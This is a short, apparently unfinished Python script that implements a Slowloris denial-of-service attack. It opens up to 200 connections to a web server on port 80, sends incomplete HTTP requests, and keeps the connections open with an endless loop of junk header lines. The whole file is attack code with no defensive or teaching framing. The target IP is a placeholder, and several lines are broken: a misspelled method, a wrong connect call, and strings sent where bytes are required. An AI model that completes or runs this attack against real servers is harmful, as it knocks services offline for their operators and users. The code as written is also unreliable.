import socket
import random

port = 80 # 80 is usually used for http requests
ip = "nope"
socket_count = 200
sockets = []

def create_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimout(4) # maybe this line can be removed or set really high idk yet
    s.connect(ip, port)
    s.send(f"GET /?{random.randint(1,255)} HTTP/1.1\r\n")
    return s

def slowloris():

    # TODO use argv to pass in IP and port and socket count
    
    while True:

        # Make sure there are still socket_count sockets
        for i in range(socket_count - len(sockets)):
            try:
                s = create_socket(ip, port)
                sockets.append(s)
            except:
                print("socket could not be established")
                break

        for s in sockets:
            try:
                s.send(f"X-a {random.randint(1,255)}\r\n")
            except:
                sockets.remove(s)

if __name__ == "__main__":
    slowloris()
